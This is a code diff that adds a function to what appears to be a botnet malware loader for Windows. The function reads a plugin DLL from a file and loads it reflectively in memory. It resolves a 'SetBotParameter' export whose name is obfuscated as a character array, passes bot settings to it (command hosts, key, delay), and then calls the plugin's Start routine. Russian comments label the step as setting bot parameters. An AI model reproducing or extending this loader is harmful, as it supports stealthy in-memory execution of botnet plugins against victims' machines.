@@ -521,8 +521,44 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 	return FALSE;
 }
 
+void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
+{
+	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
+	
+	DWORD DllBodySize;
 
-		return FALSE;
+	LPBYTE DllBody = File::ReadToBufferW((PWCHAR)path, DllBodySize);
+	LDRDBG("LoadPlugFromRawFile", "File::ReadToBufferW() return 0x%X", DllBody);
+
+	if (DllBody == NULL) return;
+
+	HMEMORYMODULE Module = MemoryLoadLibrary(DllBody);
+	LDRDBG("LoadPlugFromRawFile", "MemoryLoadLibrary() return 0x%X", Module);
+
+	if (Module == NULL) return;
+
+	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
+	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);
+
+	if (SetParamMethod != NULL)
+	{
+		// Устанавливаем параметры бота
+		LDRDBG("LoadPlugFromRawFile", "Устанавливаем параметры бота ");
+		SetParam(BOT_PARAM_PREFIX);
+		SetParam(BOT_PARAM_HOSTS);
+		SetParam(BOT_PARAM_KEY);
+		SetParam(BOT_PARAM_DELAY);
+	}
+
+	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);
+
+	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");
+
+	if (Method != NULL)
+	{
+		LDRDBG("LoadPlugFromRawFile", "Plug loaded successfuly.");
+		Method(NULL, NULL, NULL);
+	}
 }
 
 #pragma comment(linker, "/ENTRY:LoaderDllMain" )
